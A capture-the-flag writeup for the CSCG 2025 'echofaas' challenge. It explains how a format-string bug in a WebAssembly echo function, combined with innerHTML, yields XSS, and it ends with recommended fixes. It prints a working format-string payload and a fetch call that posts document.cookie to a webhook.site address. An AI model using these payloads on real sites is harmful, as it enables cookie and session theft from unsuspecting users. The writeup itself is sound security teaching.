---
title: "Challenge Writeup: 'echofaas'"
subtitle: "A writeup for the 'echofaas' challenge from the CSCG 2025."
titlepage: true
author: [ "Jann Stute" ]
date: "2025-05-01"

titlepage-text-color: "FFFFFF"
titlepage-rule-color: "360049"
titlepage-rule-height: 0
titlepage-background: "Eisvogel-3.2.0/examples/title-page-custom/background.pdf"
---

# Challenge

> Everyone is talking about how cool Function as a Service is, therefore i made my own blazing fast echo function as a service using wasm.
> 
> Note: The flag is stored in the admin bot cookie. `https://{sessionid}-80-echofaas.challenge.cscg.live:1337`

**Author:** gfelber

**Difficulty:** Medium

**Categories:** pwn

**Flag:** `dach2025{th3_future_0f_w3b_1s_pwn_709d6737a468685cdf2cc2312dd36380}`

# Recon

For this challenge we get the following small C program together with a Makefile which builds it for execution in a web browser:

```c
#include <stdio.h>
#include <string.h>

#define MSG_SIZE 0x1000

char rmsg[MSG_SIZE] = "Hello, ";

static void sanitize(char *buf) {
  for (int i = 0; i < strlen(buf); ++i)
    if (buf[i] == '<')
      buf[i] = ' ';
}

char *echo(char *msg) {
  int rmsg_len = strlen(rmsg);
  sanitize(msg);
  snprintf(rmsg + rmsg_len, MSG_SIZE - rmsg_len, msg);
  return rmsg;
}

int main() { return 0; }
```

As we can see, it exposes a function called `echo` which returns what it is given, after filtering out all `<` characters. However, there is also an immediate red flag here: the user input gets used as a format string with the only filtering that is applied beforehand not restricting the use of format string specifiers at all. But before we investigate that further, let's see what is passed into this function and how the output is used, after all, there might be additional filtering or the output might not be used in a way such that potentially circumventing the `<` filtering would be a problem.

Taking a quick look at the web page two things stand out:
1. There is a report page where a URL can be reported, presumably causing the admin to visit it in a web browser which would enable us to exploit any XSS vulnerability we might find.
2. There is a javascript snippet which both modifies the DOM Tree and uses a value from the URL - a potential XSS vector.

Said javascript snippet is the following:
```js
echo().then(function (Module) {
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    document.getElementById("banner").innerHTML = Module.ccall(
        "echo",
        "string",
        ["string"],
        [urlParams.get("msg") || ""],
    );
});
```

We can see that the `msg` parameter is taken from the URL and, *without any addition filtering*, passed to the echo function from earlier. This already means that the format string vulnerability in the C program can be triggered by us.

The output from the echo function is then used to set the `innerHTML` of an element in the DOM Tree, meaning that there is potential for an XSS vulnerability here, because if the echo function can be manipulated to return an HTML script tag, a broken image with an `onerror` handler, or something similar, then malicious javascript could be executed if a victim visits a link crafted by an attacker.

# Planning the Exploit

To recap: The payload must not contain `<`, but the `echo` function must still return a valid HTML tag which requires at least one `<` character. Thus we need to exploit the format string vulnerability to introduce a `<` character into the output.

After looking at the `printf(3)` man page, the interesting part of the syntax for format string specifiers boils down to this:

`%[argument$][width][length modifier]conversion` 

`conversion` is interesting, because there is the little known `n` specifier which allows us use an argument as a pointer and to write the number of characters that have been printed so far to that pointer, thus giving us a limited ability to write memory. Fruthermore, there are the `s` and `S` specifiers which allow use to print strings from memory. These specifiers will be the basis of the exploit, because we will try to:
1. print 60 characters (the ascii code for `<`)
2. use the `n` specifier to store that count in memory
3. print that count as a character

This way we should be to introduce `<` into the output *after* that character was filtered out previously.

`[argument$]` allows use to use arguments out of order, which will make it simpler to print a precise number of characters. However there "may be no gaps in the numbers of arguments specified using '$';" (see `man 3 printf`), meaning if we use the second argument this way, we also need to use the first argument this way.

`[width]` is useful, because it allows us to specify how long the printed value should be. This allows us to make a smaller payload, because instead of writing 30 arbitrary characters we can use something like `%30i` to print 30 characters. In the real world this would be useful, because it would make the malicously crafted URL shorter and thus less suspicious, for us it is useful because it makes this writeup nicer to read :)

Finally, the `[length modifier]` allows us to specify the bit size of the argument. Why this is useful will become apparent later, but for now just keep in mind that it exists.

# Crafting the Payload

With this knowledge we can start crafting the payload. The first part of the payload is rather simple just `%1$ 60d` to print 60 arbitrary characters in order to prepare for writing to memory.

The second step is a little more complicated: We need to figure out which values are being passed to `snprintf` as the arguments, because the C program doesn't specify any arguments, so these values will just be whatever is left over from previous operations. We need to know these values, because to write to a memory adress we need to select an argument which is a valid address. In order to do this we can simply use a format string like `%d;%d;%d;%d;` as our payload and we will be greeted by web page telling us the values that the arguments have. Looking at these values the situation is rather simple: The first three arguments are all out of bounds and all the values after that are zero. Thus, with zero being the only valid memory address out of the bunch, we choose the fourth argument for writing our character to memory. Therefore, our payload now looks like this:

`%1$ 60d%4$n`

Next, we need to read the value from memory and print it as a character. The format specifier you would normally use for this is `s`, however, trying to do this here will only print `(null)` because the address is `0x0`. At this point I started looking at the way that `snprintf` is [implemented in emscripten](https://github.com/emscripten-core/emscripten/blob/99b77d04f9bf8857673e2c909c58030b8a3e45f9/system/lib/libc/musl/src/stdio/vfprintf.c#L482), the compiler used by the Makefile, to look for a way to circumvent this behaviour. What I found was that the other specifier for printing strings, `S`, which prints wide chars does not have this check at all. So, we can use `%4$S` to print the `<` from address `0x0` without having it print `(null)` instead, which leads us to this payload:

`%1$ 60d%4$n%4$S`

Trying out this new version of the payload shows a new problem however. Because while the first wide char is indeed `<` as intended the second one is not printable which causes an exception and leads to nothing being printed. This is where the `[length modifier]` I mentioned earlier comes in handy. This is because each character is stored at a 4 byte offset from the last one, so we can use `ll` when writing `<` to memory, which will write 8 bytes, and because of the endianness the first character will then still be `<`, but the second character will be overwritten with a null byte which is the string terminator. After applying this change, our paylod now looks like this:

`%1$ 60d%4$lln%4$S`

Now we can add what is necessary to build an `img` that with an `onerror` handler, like this:

`%1$ 60d%4$lln%4$Simg src="" onerror="alert(1)">`

Finally we just need to add `%2$c%3$c` at the end in order to satisfy the requirement that there be no gaps in the arguments used with the `$`-notation and we now have a working proof of concept (note that this, of course, needs to be url encoded and added as the URL parameter `msg`):

`%1$ 60d%4$lln%4$Simg src="" onerror="alert(1)"> %2$c%3$c`

# Getting the Flag

At this point, getting the flag is quite simple we can just replace the `alert(1)` with a js payload to extract the cookies, like this one:

`fetch('https://webhook.site/<insert_uuid_here>', {method: 'POST', mode: 'no-cors', body: document.cookie})`

And then we head to `/report` and submit the URL with our encoded payload, which, as mentioned earlier, will lead to an admin visiting that URL and to our js payload being executed. After that we can then observe a POST request with the flag in the body being made to the URL.

# Fixing the Vulnerabilities

There are two security related issues here that should be fixed:
1. The usage of `snprintf` with user input as the format string.
2. The usage of `innerHTML` with (improperly) filtered user input.

Fixing the format string vulnerability is quite simple, as the call to `snprintf` could easily be replaced by a call to `memcpy` which would completely eliminate the format string vulnerability without any change in the normal behaviour of `echo`.

Fixing the way that the user input is added into the DOM Tree is similarly simple, as the usage of `innerHTML` could simply be replaced with `innerText` which does not attempt to parse the input as HTML. In scenarios where the user should be able to use certain HTML tags, this would be more complicated, because proper filtering would be necessary. In this case however no filtering is necessary as long as `innerText` is used instead.
